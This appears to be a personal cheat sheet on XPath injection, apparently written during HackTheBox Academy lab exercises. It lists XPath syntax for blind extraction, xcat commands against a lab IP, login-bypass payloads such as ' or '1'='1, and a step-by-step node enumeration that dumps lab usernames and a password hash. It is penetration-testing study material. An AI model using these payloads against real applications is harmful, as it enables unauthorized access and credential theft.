Here i will try to resume all the useful information tips&tricks on how to approach XPATH injections.

# Basic commands
```
/           Select root node
//          Select the nodes from the same context(from the query base standpoint)
.           Select the context node (from the query base standpoint)
..          Go back one step from context node aka the parent (from the query base standpoint)
@SOMETHING  Select a attribute based on nome     (In this case tier is a attribute <tier difficulty="medium">2</tier> )
text()      Get all the strings from document
//*         Get all elements of the document (aka select * )
AND/OR      We know it
|           It's a UNION like, will concatenate commands

contains(.,'VALUE')             This filters all elements where the value is matched (give a specific value if you need )
name(XXXX)                      Returns the node name
count(/users/*)=1               Count the elements in the node 
string-length(name(/*[1]))=X    Get the string lenght and compare with a number(X), usefull for guessing node name in blindinjection.
substring(name(/*[1]),1,1)='a'  Similar as the one above but will extract the designed char, usefull for blind                                                               exfiltrations(play around with first number aka index to iterate thru chars in the name) 
```


# XPATH Injection tools
There is a SQLMap *like* tool that you might want to use to identify endpoint and exploit possible XPATH injections.
https://github.com/orf/xcat

### Exfiltration examples
**xcat** detect http://172.17.0.2/index.php q `q=BAR f=fullstreetname --true-string='!No Result'`
(You have to ship the data sent to the **index.php** and with true-string the tools know whenever the condition is matched or not!)
## Send via POST request
**xcat** detect http://172.17.0.2/index.php username `username=admin -m POST --true-string=successfully --encode FORM`
(Here for example we ship the whole URL, then the vulnerable parameter which is username together with a value that will give back a valid response like username=admin. Next we must indicate a string that matches a success status we know from the exercise upon success the web-app gave "Message successful sent!" so XCAT knows what to filter out from the response upon success and lastly encode to URL encode the POST request)


# XPATH Authentication Bypass
Here I will try to show some payloads that might be used to perform some Authentication bypasses and gain access to  login portal.
### Start easy
(this will always be true and in some cases will bypass login portals)
```
 ' or '1'='1
```
### Bypass authentication and login as another user 
(change the position()=ID to match other users...)
```
' or position()=2 or '
```
### Bypass by searching a specific username ex admin
(this is useful if there are too many users to scroll thru manually)
```
' or contains(.,'admin') or '
```


# XPATH Limit & Offset
This guide is useful to simulate as same way as LIMIT/OFFSET does on which element we want to grab and show if we can't show all rows in the response front-end.

1) we must first identify the number of nodes:
Start by fuzzing until you get something out of it, example `&f=streetname | /*[1]` 
And continue sequentially `&f=streetname | /*[1]/*[1]      &f=streetname | /*[1]/*[1]     &f=streetname | /*[1]/*[1]/*[1]` 
Until you can find the number of nodes:
```
fullstreetname | /*[1] 	Nothing
fullstreetname | /*[1]/*[1] 	Nothing
fullstreetname | /*[1]/*[1]/*[1] 	Nothing
fullstreetname | /*[1]/*[1]/*[1]/*[1] 	01ST ST
fullstreetname | /*[1]/*[1]/*[1]/*[1]/*[1] 	No Results!
```

Now that we identified **4nr** of nodes we must iterate so we filter only our rows. Usually the top right will be the index that chooses elements of a node:
```
fullstreetname | /*[1]/*[2]/*[1]/*[1]/*[1] 	htb-stdnt
fullstreetname | /*[1]/*[2]/*[1]/*[1]/*[2] 	295362c2618a05ba3899904a6a3f5bc0
fullstreetname | /*[1]/*[2]/*[1]/*[1]/*[3] 	HackTheBox Academy Student Account
fullstreetname | /*[1]/*[2]/*[1]/*[1]/*[4] 	No Results!
```

As you see the last index chose different elements from a row, think like a column from a select query
If you want to take it further you have to change the index towards left until you find the other rows ex:
```
fullstreetname | /*[1]/*[2]/*[1]/*[2]/*[1] 	No Results!
fullstreetname | /*[1]/*[2]/*[1]/*[2]/*[2] 	No Results!
fullstreetname | /*[1]/*[2]/*[1]/*[2]/*[3] 	No Results!
fullstreetname | /*[1]/*[2]/*[1]/*[1]/*[4] 	No Results!
```

As you see the second(from right) didn't worked so we can so same on 3:
```
fullstreetname | /*[1]/*[2]/*[2]/*[1]/*[1] 	admin
fullstreetname | /*[1]/*[2]/*[2]/*[1]/*[2] 	295362c2618a05ba3899904a6a3f5bc0
fullstreetname | /*[1]/*[2]/*[2]/*[1]/*[3] 	XXFLAG_HEREXX
fullstreetname | /*[1]/*[2]/*[2]/*[1]/*[4] 	No Results!
```